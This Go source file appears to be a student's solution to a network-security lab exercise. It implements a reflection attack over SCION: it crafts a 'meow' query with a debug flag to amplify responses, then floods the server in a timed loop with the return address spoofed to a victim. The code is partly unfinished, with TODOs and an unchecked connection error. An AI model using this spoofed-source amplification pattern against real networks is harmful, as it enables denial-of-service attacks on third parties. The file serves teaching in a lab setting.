package client

import (
	"context"
	"encoding/json"
	"fmt"
	"time"

	// Unused imports are commented because Golang inhibits you from building the package
	// if any of these are around. 

	"student.ch/netsec/isl/attack/help"
	"student.ch/netsec/isl/attack/meow"

	// These imports were used to solve this task.
	// There are multiple ways of implementing the reflection. You can use
	// anything additional from the scion codebase and might not need all of
	// the listed imports below. But these should help you limit the scope and
	// can be a first starting point for you to get familiar with the options.
	"github.com/scionproto/scion/go/lib/addr"
	//"github.com/scionproto/scion/go/lib/common"
	//"github.com/scionproto/scion/go/lib/l4"
	"github.com/scionproto/scion/go/lib/sciond"
	"github.com/scionproto/scion/go/lib/snet"
	"github.com/scionproto/scion/go/lib/sock/reliable"
	//"github.com/scionproto/scion/go/lib/spath"
)

func GenerateAttackPayload() []byte {
	var q meow.Query = "4"

	//Flags
	//metadata

	//he*, ve*, me*, de*
	//he headTail heapGoal heap_sys
	//ve verbose
	//de debug
	request := meow.NewRequest(q, meow.AddFlag("debug"))

	d, err := json.Marshal(request)
	if err != nil {
		fmt.Println(err)
		return make([]byte, 0) // empty paiload on fail
	}
	return d
}

// serverAddr: The server IP addr and port in the form: ISD-IA,IP:port
// spoofed addr: The spoofed return address in the form: ISD-IA,IP:port
func Attack(ctx context.Context, serverAddr string, spoofedSrc string, payload []byte) (err error) {

	// The following objects might be useful and you may use them in your solution,
	// but you don't HAVE to use them to solve the task.

	// Parse the addresses from the given strings
	meowServerAddr, err := snet.ParseUDPAddr(serverAddr)
	if err != nil {
		return err
	}
	spoofedAddr, err := snet.ParseUDPAddr(spoofedSrc)
	if err != nil {
		return err
	}


	//Port = 51538
	
	// Context
	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
	defer cancel()


	
	
	// Here we initialize handles to the scion daemon and dispatcher running in the namespaces
	// SCION dispatcher
	
	dispSockPath, err := help.ParseDispatcherSocketFromConfig()
	if err != nil {
		return err
	}

	dispatcher := reliable.NewDispatcher(dispSockPath)

	// SCION daemon
	
	sciondAddr, err := help.ParseSCIONDAddrFromConfig()
	if err != nil {
		return err
	}

	
	
	sciondConn, err := sciond.NewService(sciondAddr).Connect(ctx)
	if err != nil {
		return err
	}

	



	//spoofedIA := spoofedAddr.IA
	meowIA := meowServerAddr.IA
	//sciondConn.LocalIA = spoofedIA

	//localIA, err := sciondConn.LocalIA(ctx)
	//sciondConn.address = spoofedSrc



	pathQuerier := sciond.Querier{Connector: sciondConn, IA: meowIA}

	//spoofedIA
	nnet := snet.NewNetworkWithPR(
		meowIA,
		dispatcher,
		pathQuerier,
		sciond.RevHandler{Connector: sciondConn},
	)

	//path,err := meowServerAddr.GetPath()
	//fmt.Println(path)

	laddr := spoofedAddr.Host
	// fmt.Println(spoofedIA)
	// fmt.Println("haha")
	// fmt.Println(laddr)

	
	
	conn, err := nnet.Dial(context.Background(), "udp", laddr, meowServerAddr, addr.SvcNone)
	defer conn.Close()



	//conn.Write(payload)
	//buffer := make([]byte, meow.MAXBUFFERSIZE)
	//fmt.Printf("CLIENT: Packet-written: bytes=%d addr=%s\n", n, serverAddr)
	
	
	

	// TODO: Set up a scion connection with the meow-server
	// and spoof the return address to reflect to the victim.
	// Don't forget to set the spoofed source port with your
	// personalized port to get feedback from the victims.

	// This is here to make the go-compiler happy
	fmt.Println(meowServerAddr.String())
	fmt.Println(spoofedAddr.String())

	//attack_payload := GenerateAttackPayload()





	for start := time.Now(); time.Since(start) < ATTACK_TIME; {
		//Something goes here
		conn.Write(payload)

	}
	return nil
}
